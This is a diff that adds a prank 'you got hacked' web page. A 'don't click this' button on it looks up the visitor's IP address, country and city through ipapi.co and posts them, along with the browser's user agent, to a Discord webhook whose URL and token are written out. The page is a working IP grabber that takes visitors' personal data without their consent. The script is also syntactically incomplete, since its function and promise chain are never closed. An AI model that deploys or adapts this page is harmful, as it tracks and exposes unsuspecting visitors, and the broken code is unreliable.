@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>yougothackedlol</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: red;
+      font-family: monospace;
+    }
+    button {
+      padding: 20px 30px;
+      font-size: 18px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: darkred;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="showLocation()">ALR DONT CLICK THIS</button>
+
+  <script>
+    function getFlagEmoji(countryCode) {
+      return countryCode
+        .toUpperCase()
+        .replace(/./g, char =>
+          String.fromCodePoint(127397 + char.charCodeAt())
+        );
+    }
+
+    function showLocation() {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const country = data.country_name;
+          const city = data.city;
+          const countryCode = data.country_code;
+          const flag = getFlagEmoji(countryCode);
+          const userAgent = navigator.userAgent;
+
+          const message = `User is from ${flag} ${country}, ${city}.\nIP: ${ip}\nDevice: ${userAgent}`;
+
+          fetch('https://discord.com/api/webhooks/1374638677120254012/yHFKXXXYaF4J0P7VfmXSlxsEJKNCF8wg7mu8pliQG3a_85QD1Uac8o9ECs7aKdvHAM2j', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+             body: JSON.stringify({
+              content: message
+            })
+          });
+  </script>
+</body>
+</html>
